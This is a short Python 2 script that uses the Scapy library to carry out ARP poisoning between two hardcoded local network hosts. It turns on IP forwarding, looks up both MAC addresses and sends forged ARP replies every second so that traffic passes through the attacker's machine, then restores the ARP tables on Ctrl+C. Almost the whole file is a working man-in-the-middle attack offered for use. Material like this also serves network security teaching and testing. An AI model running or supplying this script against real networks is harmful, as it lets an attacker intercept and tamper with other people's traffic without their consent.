'''
###########################################
Author: Qaidjohar Jawadwala
Organization: QJ Technologies.
--------------------------------------------
Code Title: ARP Poisioning using Scapy with Python
-------------------------------------------
#Steps fo Implementation:
---Import Scapy
---Accept Server and Victim IP address_string
---Retrieve MAC address of Server and Victim
---IP forwarding to 1
---Create Spoofed Packets
---Send Spoofed Packets on network
---IP forwarding back to 0

#################################################
'''

from scapy.all import *
#No useless data on the screen
conf.verb = 0
import sys
import os
import time
import signal

#Function to fetch MAC address given a IP address
def getMAC(ip):
	try:
		val = arping(ip)
		return val[0][0][1].src
	except:
		return 0


#Accepting IP Addresses
ip_addr1 = '192.168.4.125'
ip_addr2 = '192.168.4.142'

#Enabling IP Forwarding of Attacker Machine
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

#Fetching MAC address of Victim and Server from IP
mac_addr1 = getMAC(ip_addr1)
if not (mac_addr1):
	sys.exit("Machine 1 not Found...")
mac_addr2 = getMAC(ip_addr2)
if not (mac_addr2):
	sys.exit("Machine 2 not Found...")

#Handling Signal of Ctrl+c
def signal_handler(signal, frame):
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        #Release the ARP spoofed Server Machine
        send(ARP(op=2, pdst=ip_addr1, psrc=ip_addr2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_addr2), count=3)
        #Release the ARP spoofed Victim Machine
        send(ARP(op=2, pdst=ip_addr2, psrc=ip_addr1, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=mac_addr1), count=3)
        print "ARP Spoofing Released...\nGood Bye..See You Later..."
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

while True:
	#ARP Frame for Machine 1 with spoofed MAC of Attacker from Machine 2
	send(ARP(op=2, pdst=ip_addr1, psrc=ip_addr2, hwdst=mac_addr1))
	#ARP Frame for Machine 2 with spoofed MAC of Attacker from Machine 1
	send(ARP(op=2, pdst=ip_addr2, psrc=ip_addr1, hwdst=mac_addr2))
	print ("ARP Spoofed of "+ip_addr1+" and "+ip_addr2+".")
	time.sleep(1)
